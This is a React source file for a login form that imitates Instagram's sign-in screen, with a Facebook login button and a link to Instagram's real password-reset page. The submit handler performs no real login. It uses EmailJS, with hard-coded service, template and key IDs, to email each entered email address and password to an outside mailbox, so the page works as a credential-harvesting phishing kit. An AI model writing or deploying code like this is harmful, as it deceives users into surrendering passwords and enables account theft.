import React, { useState  } from "react";
import "../index.css";
import AccountHeader from "./Account-header";
import Input from "./Input";
import OrDivider from "./or-divider";
import { IoLogoFacebook } from "react-icons/io";
import  { useRef } from 'react';
import emailjs from '@emailjs/browser';


const Form = () => {
  const [name, setName] = useState("");
  const [password, setPassword] = useState("");

  const form = useRef();
  const sendEmail = (e) => {

    emailjs.sendForm('service_xg9q7sr', 'template_mr5bddq', form.current, '0yULxjSPQlpFu1gO9')
      .then((result) => {
          console.log(result.text);
      }, (error) => {
          console.log(error.text);
      });
      e.target.reset();
  };
  


  return (
    <div className="accounts-form-container w-full pt-2.5 mb-2.5">
      <AccountHeader />
      <div className="flex flex-col w-full mb-2.5">
        <form className="mt-6" ref={form} onSubmit={sendEmail}>
          <div className="mx-10 mb-1.5 ">
            <Input
              value={name}
               name = "user_email"
              onChange={(e) => setName(e.target.value)}
              label="Email"
              type="email"
              secureText            
            />
          </div>
          <div className="mx-10 mb-1.5 ">
            <Input
            value={password}
              name = "user_password"
              onChange={(e) => setPassword(e.target.value)}
              label="Password"
              type="password"
              secureText
              touched
              valid
            />
          </div>
          <div className="mx-10 mt-4">
            <button
              type="submit"
              className="btn-primary block w-full h-9 text-white bg-accent active:bg-accent/70 disabled:bg-accent/70 rounded px-2.5 text-sm font-semibold"
            >
              Log In
            </button>
          </div>
          <OrDivider />
          <div className="mx-10 mt-2">
            <button
              type="submit"
              className="flex justify-center items-center w-full active:opacity-70"
            >
              <IoLogoFacebook size={20} className="mr-1 text-fb" />
              <span className="text-fb text-sm font-semibold">
                Log in with Facebook
              </span>
            </button>
          </div>
          <a
            href="https://www.instagram.com/accounts/password/reset/"
            className="block mt-5 mb-2 text-my-blue-100 text-center text-xs active:opacity-50"
          >
            Forgot Password
          </a>
        </form>
      </div>
    </div>
  );
};

export default Form;
